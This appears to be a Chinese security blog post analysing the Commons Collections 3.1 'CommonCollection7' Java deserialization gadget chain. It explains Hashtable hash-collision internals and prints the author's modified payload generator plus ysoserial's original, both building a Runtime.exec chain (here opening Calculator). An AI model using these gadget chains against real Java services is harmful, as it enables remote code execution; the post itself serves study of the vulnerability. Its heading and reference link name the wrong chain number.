---
title: "Java反序列化利用链学习 - CommonCollection7"
date: 2022-05-05T15:21:00+08:00
lastmod: 2022-05-05T17:23:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection7

### 前置条件

* commons-collections 3.1

### 利用链分析

`CommonCollection6`利用链的调用过程大致如下：

```
Gadget chain:
    java.io.ObjectInputStream.readObject()
        java.util.Hashtable.readObject()
            java.util.Hashtable.reconstitutionPut()
                org.apache.commons.collections.map.AbstractMapDecorator.equals()
                    java.util.AbstractMap.equals()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
```

用`ysoserial`工具的代码测试的时候发现在本地并无法使用，关键原因在`java.util.Hashtable#reconstitutionPut`

```java
private void reconstitutionPut(Entry<K,V>[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = hash(key);
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<K,V> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    Entry<K,V> e = tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

利用链的触发，需要进入`if ((e.hash == hash) && e.key.equals(key))`，但由于`ysoserial`中的代码构造时所用的两个`lazyMap1-2`对象计算所得`hash`相同并未产生碰撞。并因此间接导致中在`java.util.Hashtable#readObject`中，`elements=1`导致无法再次进入`reconstitutionPut`，触发`e.key.equals(key)`。

```java
private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException
{
    // Read in the length, threshold, and loadfactor
    s.defaultReadObject();

    // Read the original length of the array and number of elements
    int origlength = s.readInt();
    int elements = s.readInt();

    // Compute new size with a bit of room 5% to grow but
    // no larger than the original size.  Make the length
    // odd if it's large enough, this helps distribute the entries.
    // Guard against the length ending up zero, that's not valid.
    int length = (int)(elements * loadFactor) + (elements / 20) + 3;
    if (length > elements && (length & 1) == 0)
        length--;
    if (origlength > 0 && length > origlength)
        length = origlength;

    Entry<K,V>[] newTable = new Entry[length];
    threshold = (int) Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;
    initHashSeedAsNeeded(length);

    // Read the number of elements and then all the key/value objects
    for (; elements > 0; elements--) {
        K key = (K)s.readObject();
        V value = (V)s.readObject();
        // synch could be eliminated for performance
        reconstitutionPut(newTable, key, value);
    }
    this.table = newTable;
}
```

这里我修改过后的构造代码如下，有点长（写的不好）

```java
public Object getObject(String command) throws Exception {
    Transformer[] falseTransformer = new Transformer[] {
            new ConstantTransformer(1)
    };
    Transformer[] trueTransformer = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                    new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
    };

    ChainedTransformer chainedTransformer = new ChainedTransformer(falseTransformer);

    Map innerMap1 = new HashMap();
    Map innerMap2 = new HashMap();

    // 创建两个会导致hash碰撞的lazyMap，这样才能保证put进入HashSet时，其成员count=2，也就是反序列化时elements=2
    Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
    lazyMap1.put("yy", 1);

    Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
    lazyMap2.put("zZ", 2);

    Hashtable hashtable = new Hashtable();
    hashtable.put(lazyMap1, 1);
    hashtable.put(lazyMap2, 2);

    Reflections.setFieldValue(chainedTransformer, "iTransformers", trueTransformer);

    // 这里需要保证两个lazyMap的hash相同，才能成功进入if ((e.hash == hash) && e.key.equals(key))中的e.key.equals(key)
    Field table = Reflections.getField(hashtable.getClass(), "table");
    Object[] tables = (Object[]) table.get(hashtable);

    Field key = Reflections.getField(tables[1].getClass(), "key");
    LazyMap lazyMap = (LazyMap) key.get(tables[1]);

    Field map = Reflections.getField(lazyMap.getClass(), "map");
    Map mapMap = (Map) map.get(lazyMap);

    Field hashEntryTable = Reflections.getField(mapMap.getClass(), "table");
    Object[] hashEntryTables = (Object[]) hashEntryTable.get(mapMap);

    Field value = Reflections.getField(hashEntryTables[12].getClass(), "value");
    Reflections.setFieldValue(hashEntryTables[12], "value", 2);

    Reflections.setFieldValue(hashtable, "table", tables);

    return hashtable;
}
```

`ysoserial`中的相关代码如下

```java
public Hashtable getObject(final String command) throws Exception {

    // Reusing transformer chain and LazyMap gadgets from previous payloads
    final String[] execArgs = new String[]{command};

    final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",
            new Class[]{String.class, Class[].class},
            new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke",
            new Class[]{Object.class, Object[].class},
            new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec",
            new Class[]{String.class},
            execArgs),
        new ConstantTransformer(1)};

    Map innerMap1 = new HashMap();
    Map innerMap2 = new HashMap();

    // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
    lazyMap1.put("yy", 1);

    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
    lazyMap2.put("zZ", 1);

    // Use the colliding Maps as keys in Hashtable
    Hashtable hashtable = new Hashtable();
    hashtable.put(lazyMap1, 1);
    hashtable.put(lazyMap2, 2);

    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

    // Needed to ensure hash collision after previous manipulations
    lazyMap2.remove("yy");

    return hashtable;
}
```

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java>
